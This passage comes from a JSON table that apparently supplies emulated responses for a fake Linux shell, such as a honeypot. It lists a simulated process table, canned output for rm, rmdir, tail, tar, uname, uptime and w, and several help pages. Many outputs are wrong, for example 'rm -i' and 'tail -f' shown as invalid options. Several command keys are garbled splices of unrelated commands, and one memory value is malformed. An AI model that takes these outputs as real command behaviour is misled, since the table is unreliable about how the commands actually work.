[deferwq]                   \nroot         39    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/u4:1]              \nroot         74    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [ata_sff]                   \nroot         75    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kpsmoused]                 \nroot         78    0.0        0.0        0         0         ?       S<    Jul22 0.0   [scsi_eh_0]                 \nroot         79    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [scsi_tmf_0]                \nroot         80    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kworker/u4:2]              \nroot         83    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kworker/1:1H]              \nroot         88    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/0:1H]              \nroot         103   0.0        0.0        0         0         ?       D<    Jul22 0.0   [jbd2/sda1-8]               \nroot         104   0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [ext4-rsv-conver]           \nroot         135   0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kauditd]                   \nroot         141   0.0        0.43       41754624  2211840   ?       Ss    Jul22 0.05  /lib/systemd/systemd-udevd  \nroot         150   0.0        1.12       38326272  5820416   ?       S<    Jul22 0.16  /lib/systemd/systemd-journald\nroot         360   0.0        0.35       37969920  1789952   ?       Ss    Jul22 0.0   /sbin/rpcbind -w            \nstatd        382   0.0        0.34       38174720  1748992   ?       Ss+   Jul22 0.0   /sbin/rpc.statd             \nroot         387   0.0        0.0        0         0         ?       D<    Jul22 0.0   [rpciod]                    \nroot         392   0.0        0.0        0         0         ?       Ss    Jul22 0.0   [nfsiod]                    \nroot         407   0.0        0.0        23916544  12288     ?       Ss    Jul22 0.0   /usr/sbin/rpc.idmapd        \nroot         413   0.0        0.31       19480576  1597440   ?       Ss    Jul22 0.0   /usr/sbin/atd -f            \nroot         414   0.0        0.51       28135424  2641920   ?       Ss    Jul22 0.01  /usr/sbin/cron -f           \nroot         417   0.0        0.34       20332544  1757184   ?       Ss+   Jul22 0.05  /lib/systemd/systemd-logind \nmessagebus   419   0.0        0.51       43245568  2646016   ?       Ss+   Jul22 0.52  /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation\nroot         425   0.0        0.4        264880128 2088960   ?       D<    Jul22 0.04  /usr/sbin/rsyslogd -n       \nroot         427   0.0        0.31       4358144   1585152   ?       Ss    Jul22 0.0   /usr/sbin/acpid             \nroot         442   0.0        0.33       14761984  1708032   tty1    Ss    Jul22 0.0   /sbin/agetty --noclear tty1 linux\nroot         448   0.0        0.59       56508416  3067904   ?       D<    Jul22 0.01  /usr/sbin/sshd -D           \nDebian-exim  682   0.0        0.42       54530048  2154496   ?       D<    Jul22 0.0   /usr/sbin/exim4 -bd -q30m   \nroot         697   0.0        0.11       26009600  589824    ?       Ss    Jul22 0.0   dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0\nroot         8574  0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [iprt-VBoxWQueue]           \nroot         8611  0.0        0.0        0         0         ?       D<    Jul22 0.0   [ttm_swap]                  \nroot         8743  0.0        0.21       307101696 1064960   ?       Ss    Jul22 0.17  /usr/sbin/VBoxService --pidfile /var/run/vboxadd-service.sh\nroot         9030  0.0        0.47       26009600  2424832   ?       Ss+   Jul22 0.0   dhclient -v -pf /run/dhclient.eth1.pid -lf /var/lib/dhcp/dhclient.eth1.leases eth1\nroot         21704 0.0        0.29       4440064   1507328   ?       D<    Jul22 0.0   /bin/sh /usr/bin/mysqld_safe\nmysql        22049 0.0        9.28       137470771248103424  ?       S<    Jul22 5.91  /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306\nejabberd     25061 0.0        0.05       27955200  233472    ?       Ss    Jul23 0.14  /usr/lib/erlang/erts-6.2/bin/epmd -daemon\nroot         25065 0.0        0.0        0         0         ?       Ss+   Jul23 0.0   [kworker/0:0]               \nejabberd     25095 0.0        8.87       968404992 45989888  ?       Ss    Jul23 3.41  /usr/lib/erlang/erts-6.2/bin/beam.smp -K true -P 250000 -- -root /usr/lib/erlang -progname erl -- -home /var/lib/ejabberd -- -sname ejabberd -noshell -noinput -noshell -noinput -pa /usr/lib/x86_64-linux-gnu/ejabberd/ebin -mnesia dir \"/var/lib/ejabberd\" -ejabberd log_rate_limit 100 log_rotate_size 0 log_rotate_date \"\" -s ejabberd -sasl sasl_error_logger {file,\"/var/log/ejabberd/erlang.log\"} -smp auto start \nroot         25970 0.0        0.0        0         0         ?       D<    Jul23 0.0   [kworker/1:0]               \nroot         26418 0.0        0.6        93380608  3092480   ?       Ss+   Jul23 0.0   nginx: master process /usr/sbin/nginx -g daemon on; master_process on;\nwww-data     26419 0.0        0.73       93704192  3760128   ?       Ss+   Jul23 0.29  nginx: worker process                           \nwww-data     26420 0.0        0.73       93704192  3760128   ?       D<    Jul23 0.36  nginx: worker process                           \nwww-data     26421 0.0        0.73       93704192  3760128   ?       Ss+   Jul23 0.2   nginx: worker process                           \nwww-data     26422 0.0        0.73       93704192  3760128   ?       D<    Jul23 0.45  nginx: worker process                           \nroot         28001 0.0        0.0        0         0         ?       Ss    Jul23 0.0   [kworker/0:2]               \nroot         28002 0.0        0.0        0         0         ?       Ss    Jul23 0.0   [kworker/1:1]               \nroot         6960  0.0        0.1        5416      1024      ?       Ss    Jul22 0:00  /usr/sbin/sshd: root@pts/0    \nroot         6965  0.0        0.1        5416      1024      pts/0   Ss    06:30 0:00  -bash                        \nroot         6967  0.0        0.1        2435      929       pts/0   Ss    06:30 0:00  ps auxww                          \n\n",
    "reset": "\u001bc\n",
    "rm -i mydirectory/file1 file2 file3 file4": "rm: invalid option -- 'i'\nTry 'rm --help' for more information\n\n",
    "rm -r mydirectory": "rm: cannot remove `mydirectory': No such file or directory\n\n",
    "rm -r mydirectory/*": "rm: cannot remove `mydirectory/*': No such file or directory\n\n",
    "rm -r mydirectory/*.txt": "rm: cannot remove `mydirectory/*.txt': No such file or directory\n\n",
    "rm -r mydirectory/file1 file2": "rm: cannot remove `mydirectory/file1': No such file or directory\nrm: cannot remove `file2': No such file or directory\n\n",
    "rm -r mydirectory/file1 file2 file3": "rm: cannot remove `mydirectory/file1': No such file or directory\nrm: cannot remove `file2': No such file or directory\nrm: cannot remove `file3': No such file or directory\n\n",
    "rm -r mydirectory/file1 file2 file3 file4": "rm: cannot remove `mydirectory/file1': No such file or directory\nrm: cannot remove `file2': No such file or directory\nrm: cannot remove `file3': No such file or directory\nrm: cannot remove `file4': No such file or directory\n\n",
    "rm -r mydirectory/file1 file2 file3 file4/file5": "rm: cannot remove `mydirectory/file1': No such file or directory\nrm: cannot remove `file2': No such file or directory\nrm: cannot remove `file3': No such file or directory\nrm: cannot remove `file4/file5': No such file or directory\n\n",
    "rm -r mydirectory/file1 file2 file3 file4/file5/file6": "rm: cannot remove `mydirectory/file1': No such file or directory\nrm: cannot remove `file2': No such file or directory\nrm: cannot remove `file3': No such file or directory\nrm: cannot remove `file4/file5/file6': No such file or directory\n\n",
    "rm -r mydirectory/file1 file2 file3 file4/file5/file6/file7": "rm: cannot remove `mydirectory/file1': No such file or directory\nrm: cannot remove `file2': No such file or directory\nrm: cannot remove `file3': No such file or directory\nrm: cannot remove `file4/file5/file6/file7': No such file or directory\n\n",
    "rm -r mydirectory/file1 file2 file3 file4/file5/file6/file7/*git update-ref": "rm: cannot remove `mydirectory/file1': No such file or directory\nrm: cannot remove `file2': No such file or directory\nrm: cannot remove `file3': No such file or directory\nrm: cannot remove `file4/file5/file6/file7/*git': No such file or directory\nrm: cannot remove `update-ref': No such file or directory\n\n",
    "rm -r mydirectory/file1 file2 file3 file4/file5/file6/file7/*ldapsearch": "rm: cannot remove `mydirectory/file1': No such file or directory\nrm: cannot remove `file2': No such file or directory\nrm: cannot remove `file3': No such file or directory\nrm: cannot remove `file4/file5/file6/file7/*ldapsearch': No such file or directory\n\n",
    "rm -v myfile.txt": "rm: cannot remove `myfile.txt': No such file or directory\n\n",
    "rmdir -p /home/phil/directory1 /home/phil/directory2 /home/phil/directory3": "rmdir: failed to remove `-p': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\n\n",
    "rmdir -p /home/phil/directory1 /home/phil/directory2 /home/phil/directory3 /home/phil/directory4": "rmdir: failed to remove `-p': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\nrmdir: failed to remove `/home/phil/directory4': No such file or directory\n\n",
    "rmdir -p /home/phil/directory1 /home/phil/directory2 /home/phil/directory3 /home/phil/directory4 /home/phil/directory5": "rmdir: failed to remove `-p': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\nrmdir: failed to remove `/home/phil/directory4': No such file or directory\nrmdir: failed to remove `/home/phil/directory5': No such file or directory\n\n",
    "rmdir -p /home/phil/nested/directory": "rmdir: failed to remove `-p': No such file or directory\nrmdir: failed to remove `/home/phil/nested/directory': No such file or directory\n\n",
    "rmdir -p /home/phil/nested/directory1 /home/phil/nested/directory2": "rmdir: failed to remove `-p': No such file or directory\nrmdir: failed to remove `/home/phil/nested/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/nested/directory2': No such file or directory\n\n",
    "rmdir -r /home/phil/directory1": "rmdir: failed to remove `-r': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\n\n",
    "rmdir -r /home/phil/directory1 /home/phil/directory2": "rmdir: failed to remove `-r': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\n\n",
    "rmdir -r /home/phil/directory1 /home/phil/directory2 /home/phil/directory3": "rmdir: failed to remove `-r': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\n\n",
    "rmdir -r /home/phil/directory1 /home/phil/directory2 /home/phil/directory3 /home/phil/directory4": "rmdir: failed to remove `-r': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\nrmdir: failed to remove `/home/phil/directory4': No such file or directory\n\n",
    "rmdir -r /home/phil/directory1 /home/phil/directory2 /home/phil/directory3 /home/phil/directory4 /home/phil/directory5getfacl": "rmdir: failed to remove `-r': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\nrmdir: failed to remove `/home/phil/directory4': No such file or directory\nrmdir: failed to remove `/home/phil/directory5getfacl': No such file or directory\n\n",
    "rmdir -r /home/phil/directory1 /home/phil/directory2 /home/phil/directory3 /home/phil/directory4 /home/phil/directory5shuf": "rmdir: failed to remove `-r': No such file or directory\nrmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\nrmdir: failed to remove `/home/phil/directory4': No such file or directory\nrmdir: failed to remove `/home/phil/directory5shuf': No such file or directory\n\n",
    "rmdir /home/phil/directory1": "rmdir: failed to remove `/home/phil/directory1': No such file or directory\n\n",
    "rmdir /home/phil/directory1 /home/phil/directory2": "rmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\n\n",
    "rmdir /home/phil/directory1 /home/phil/directory2 /home/phil/directory3": "rmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\n\n",
    "rmdir /home/phil/directory1 /home/phil/directory2 /home/phil/directory3 /home/phil/directory4": "rmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\nrmdir: failed to remove `/home/phil/directory4': No such file or directory\n\n",
    "rmdir /home/phil/directory1 /home/phil/directory2 /home/phil/directory3 /home/phil/directory4 /home/phil/directory5": "rmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\nrmdir: failed to remove `/home/phil/directory4': No such file or directory\nrmdir: failed to remove `/home/phil/directory5': No such file or directory\n\n",
    "rmdir /home/phil/directory1 /home/phil/directory2 /home/phil/directory3 /home/phil/directory4 /home/phil/directory5 /home/phil/directory6": "rmdir: failed to remove `/home/phil/directory1': No such file or directory\nrmdir: failed to remove `/home/phil/directory2': No such file or directory\nrmdir: failed to remove `/home/phil/directory3': No such file or directory\nrmdir: failed to remove `/home/phil/directory4': No such file or directory\nrmdir: failed to remove `/home/phil/directory5': No such file or directory\nrmdir: failed to remove `/home/phil/directory6': No such file or directory\n\n",
    "rmdir /home/phil/empty/directory": "rmdir: failed to remove `/home/phil/empty/directory': No such file or directory\n\n",
    "set": "HOME=/root\nLOGNAME=root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSHELL=/bin/bash\nTMOUT=1800\nUID=0\nUSER=root\n\n",
    "sleep": "usage: sleep seconds\n\n",
    "tail -F /home/phil/file": "tail: invalid option -- 'F'\n\n",
    "tail -c 100 /home/phil/file": "tail: invalid option -- 'c'\n\n",
    "tail -f": "tail: invalid option -- 'f'\n\n",
    "tail -n +5 /home/phil/file": "tail: illegal offset -- +5\ntail: cannot open `/home/phil/file' for reading: No such file or directory\n\n",
    "tail -n -10 /home/phil/file": "tail: illegal offset -- -10\ntail: cannot open `/home/phil/file' for reading: No such file or directory\n\n",
    "tail -n 10 /home/phil/file": "tail: cannot open `/home/phil/file' for reading: No such file or directory\n\n",
    "tail -n 10 /home/phil/file | perl -lne 'print if /pattern/'": "tail: cannot open `/home/phil/file' for reading: No such file or directory\nCan't open perl script \"print if /pattern/\": No such file or directory\n\n",
    "tail -n 8 -s 10 -f /home/phil/file": "tail: invalid option -- 's'\n\n",
    "tail /test2": "\u007fELF\u0002\u0001\u0001",
    "tar caf /home/phil/target.tar.xz /home/phil/test1.txt /home/phil//test2.txt ...": "tar: /home/phil/target.tar.xz: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "tar cf /home/phil/target.tar": "tar: /home/phil/target.tar: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "tar cf /home/phil/target.tar.lzo /home/phil/test1.txt /home/phil//test2.txt ...": "tar: /home/phil/target.tar.lzo: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "tar cf /home/phil/target.tar.lzo.ustar /home/phil/test1.txt /home/phil//test2.txt ...": "tar: /home/phil/target.tar.lzo.ustar: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "tar cf /home/phil/target.tar.ustar /home/phil/test1.txt /home/phil//test2.txt ...": "tar: /home/phil/target.tar.ustar: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "tar czf /home/phil/target.tar.gz --directory=/home/phil/directory .": "tar: /home/phil/target.tar.gz: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "tar tvf /home/phil/source.tar": "tar: /home/phil/source.tar: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "tar tvsh /home/phil/source.tarpr": "tar: /home/phil/source.tarpr: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\n\n",
    "uname": "Linux\n\n",
    "uname -H": "uname: invalid option -- 'H'\nTry 'uname --help' for more information.\n\n",
    "uname -P": "uname: invalid option -- 'P'\nTry 'uname --help' for more information.\n\n",
    "uname -V": "uname: invalid option -- 'V'\nTry 'uname --help' for more information.\n\n",
    "uname -b": "uname: invalid option -- 'b'\nTry 'uname --help' for more information.\n\n",
    "uname -c": "uname: invalid option -- 'c'\nTry 'uname --help' for more information.\n\n",
    "uname -d": "uname: invalid option -- 'd'\nTry 'uname --help' for more information.\n\n",
    "uname -e": "uname: invalid option -- 'e'\nTry 'uname --help' for more information.\n\n",
    "uname -h": "uname: invalid option -- 'h'\nTry 'uname --help' for more information.\n\n",
    "uname -i": "x86_64\n\n",
    "uname -r": "3.2.0-4-amd64\n\n",
    "uname -s -v -n -r -m": "Linux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64\n\n",
    "uname -srv": "Linux 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1\n\n",
    "uname -v": "#1 SMP Debian 3.2.68-1+deb7u1\n\n",
    "uniq -c file2.txt file3.txt | grep -v \"pattern\"git remote": "grep: /root/remote: No such file or directory\n\n",
    "unzip /test2": "  End-of-central-directory signature not found.  Either this file is not\n  a zipfile, or it constitutes one disk of a multi-part archive.  In the\n  latter case the central directory and zipfile comment will be found on\n  the last disk(s) of this archive.\nunzip:  cannot find or open /test2, /test2.zip or /test2.ZIP.\n\n",
    "uptime": "18:42:08  up  3:13,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -D": "18:42:09  up  3:13,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -F": "18:42:11  up  3:13,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -M": "18:42:12  up  3:13,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -N": "18:42:13  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -O": "18:42:14  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -a": "18:42:15  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -d": "18:42:16  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -f": "18:42:17  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -h": "18:42:19  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -m": "18:42:20  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -n": "18:42:21  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -o": "18:42:22  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -p": "18:42:23  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -pgit count-objects": "18:42:24  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -psha384sum": "18:42:25  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -s": "18:42:27  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -t": "18:42:28  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -u": "18:42:29  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -v": "18:42:30  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "uptime -w": "18:42:31  up  3:14,  1 user,  load average: 0.00, 0.00, 0.00\n\n",
    "w": " 18:45:50 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h": " 18:45:51 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h -i": " 18:45:52 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -T": " 18:45:54 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -T -M": " 18:45:55 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -T -N": " 18:45:56 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -T -P": " 18:45:57 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -T -dgit reflog": " 18:45:58 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -T -m": " 18:45:59 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:45    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -T -n": " 18:46:00 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -T -p": " 18:46:02 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -t": " 18:46:03 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -t -M": " 18:46:04 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -t -N": " 18:46:05 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -t -P": " 18:46:06 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -t -d": " 18:46:07 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -t -m": " 18:46:08 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -t -n": " 18:46:10 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -h -i -t -p": " 18:46:11 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "w -i": " 18:46:12 up  3:17,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.64.1      18:46    0.00s  0.00s  0.00s w\n\n",
    "wc -l -w -c < stdin": "wc: /root/stdin: No such file or directory\n\n",
    "who -H": "root     pts/0        2024-02-23 20:06 (192.168.64.1)\n\n",
    "chgrp": "# chgrp\n> Change group ownership of files and directories. More information:\n> https://www.gnu.org/software/coreutils/chgrp.\n  * Change the owner group of a file/directory:\n`chgrp {{group}} {{path/to/file_or_directory}}`\n  * Recursively change the owner group of a directory and its contents:\n`chgrp -R {{group}} {{path/to/directory}}`\n  * Change the owner group of a symbolic link:\n`chgrp -h {{group}} {{path/to/symlink}}`\n  * Change the owner group of a file/directory to match a reference file:\n`chgrp --reference={{path/to/reference_file}} {{path/to/file_or_directory}}`",
    "git-hash-object": "# git hash-object\n> Computes the unique hash key of content and optionally creates an object\n> with specified type. More information: https://git-scm.com/docs/git-hash-\n> object.\n  * Compute the object ID without storing it:\n`git hash-object {{path/to/file}}`\n  * Compute the object ID and store it in the Git database:\n`git hash-object -w {{path/to/file}}`\n  * Compute the object ID specifying the object type:\n`git hash-object -t {{blob|commit|tag|tree}} {{path/to/file}}`\n  * Compute the object ID from `stdin`:\n`cat {{path/to/file}} | git hash-object --stdin`",
    "nl": "# nl\n> A utility for numbering lines, either from a file, or from `stdin`. More\n> information: https://www.gnu.org/software/coreutils/nl.\n  * Number non-blank lines in a file:\n`nl {{path/to/file}}`\n  * Read from `stdout`:\n`cat {{path/to/file}} | nl {{options}} -`\n  * Number only the lines with printable text:\n`nl -t {{path/to/file}}`\n  * Number all lines including blank lines:\n`nl -b a {{path/to/file}}`\n  * Number only the body lines that match a basic regular expression (BRE) pattern:\n`nl -b p'FooBar[0-9]' {{path/to/file}}`",
    "tcpdump": "# tcpdump\n> Dump traffic on a network. More information: https://www.tcpdump.org.\n  * List available network interfaces:\n`tcpdump -D`\n  * Capture the traffic of a specific interface:\n`tcpdump -i {{eth0}}`\n  * Capture all TCP traffic showing contents (ASCII) in console:\n`tcpdump -A tcp`\n  * Capture the traffic from or to a host:\n`tcpdump host {{www.example.com}}`\n  * Capture the traffic from a specific interface, source, destination and destination port:\n`tcpdump -i {{eth0}} src {{192.168.1.1}} and dst {{192.168.1.2}} and dst port\n{{80}}`\n  * Capture the traffic of a network:\n`tcpdump net {{192.168.1.0/24}}`\n  * Capture all traffic except traffic over port 22 and save to a dump file:\n`tcpdump -w {{dumpfile.pcap}} port not {{22}}`\n  * Read from a given dump file:\n`tcpdump -r {{dumpfile.pcap}}`",
    "git-rev-list": "# git rev-list\n> List revisions (commits) in reverse chronological order. More information:\n> https://git-scm.com/docs/git-rev-list.\n  * List all commits on the current branch:\n`git rev-list {{HEAD}}`\n  * Print the latest commit that changed (add/edit/remove) a specific file on the current branch:\n`git rev-list -n 1 HEAD -- {{path/to/file}}`\n  * List commits more recent than a specific date, on a specific branch:\n`git rev-list --since={{'2019-12-01 00:00:00'}} {{branch_name}}`\n  * List all merge commits on a specific commit:\n`git rev-list --merges {{commit}}`\n  * Print the number of commits since a specific tag:\n`git rev-list {{tag_name}}..HEAD --count`",
    "lpr": "# lpr\n> CUPS tool for printing files. See also: `lpstat` and `lpadmin`. More\n> information: https://www.cups.org/doc/man-lpr.html.\n  * Print a file to the default printer:\n`lpr {{path/to/file}}`\n  * Print 2 copies:\n`lpr -# {{2}} {{path/to/file}}`\n  * Print to a named printer:\n`lpr -P {{printer}} {{path/to/file}}`\n  * Print either a single page (e.g. 2) or a range of pages (e.g. 2\u201316):\n`lpr -o page-ranges={{2|2-16}} {{path/to/file}}`\n  * Print double-sided either in portrait (long) or in landscape (short):\n`lpr -o sides={{two-sided-long-edge|two-sided-short-edge}} {{path/to/file}}`\n  * Set page size (more options may be available depending on setup):\n`lpr -o media={{a4|letter|legal}} {{path/to/file}}`\n  * Print multiple pages per sheet:\n`lpr -o number-up={{2|4|6|9|16}} {{path/to/file}}`",
    "lp": "# lp\n> Print files. More information: https://manned.org/lp.\n  * Print the output of a command to the default printer (see `lpstat` command):\n`echo \"test\" | lp`\n  * Print a file to the default printer:\n`lp {{path/to/filename}}`\n  * Print a file to a named printer (see `lpstat` command):\n`lp -d {{printer_name}} {{path/to/filename}}`\n  * Print N copies of file to default printer (replace N with desired number of copies):\n`lp -n {{N}} {{path/to/filename}}`\n  * Print only certain pages to the default printer (print pages 1, 3-5, and 16):\n`lp -P 1,3-5,16 {{path/to/filename}}`\n  * Resume printing a job:\n`lp -i {{job_id}} -H resume`",
